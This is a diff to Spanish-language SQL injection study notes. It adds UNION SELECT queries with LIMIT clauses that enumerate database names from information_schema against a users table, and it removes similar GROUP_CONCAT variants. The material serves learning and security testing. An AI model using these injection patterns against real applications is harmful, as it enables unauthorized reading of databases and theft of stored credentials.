@@ -186,6 +186,8 @@ select username,password from users where username = 'F0n3' union select 'izquie
 
 #### `Union Select` + `schema_name`
 
+- `Recordatorio`: El `UNION SELECT` en ocasiones necesita de un `LIMIT` en caso que haya error en la visualización.
+
 ````sql
 ##     Tip: básicamente se inserta el basic query (SELECT schema_name FROM information_schema.schemata;) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)
 
@@ -194,9 +196,21 @@ SELECT username,password FROM users UNION SELECT 1,schema_name FROM information_
 
 ## Condition Union Select (v2):
 select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata;
+
+## Condition Union Select (v2) + LIMIT:
+select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 0,1;
+select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 1,1;
+select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 2,1;
+
+## Condition Union Select (v2) + LIMIT grupal (casi no se usa, los agrupa dependiendo el número):
+select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 0;
+select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 1;
+select username,password from users where username = 'F0n3' UNION SELECT 1,schema_name FROM information_schema.schemata LIMIT 2;
 ````
 
 #### `Group Concat` + `Union Select` + `schema_name`
+
+- `Recordatorio`: Group Concat no necesita `LIMIT` ya que se devuelve en una sola linea ;)
 
 ````sql
 ##     Tip: básicamente se inserta el query de union select un "GROUP_CONCAT" (GROUP CONCAT(schema_name)) dentro de un UNION pero se le quita el SELECT para que no se duplique ;)
@@ -206,16 +220,6 @@ SELECT username,password FROM users UNION SELECT 1,GROUP_CONCAT(schema_name) FRO
 
 ## Condition Union Select (v2):
 SELECT username,password from users where username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata;
-
-## Condition Union Select (v2) + LIMIT (En caso que solo se pueda arrojar un resultado y de error):
-SELECT username,password from users where username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata LIMIT 0,1;
-SELECT username,password from users where username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata LIMIT 1,1;
-SELECT username,password from users where username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata LIMIT 2,1;
-
-## Condition Union Select (v2) + LIMIT grupal (casi no se usa, los agrupa dependiendo el número):
-select username,password from users where username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata LIMIT 0;
-select username,password from users where username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata LIMIT 1;
-select username,password from users where username = 'F0n3' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata LIMIT 2;
 ````
 
 
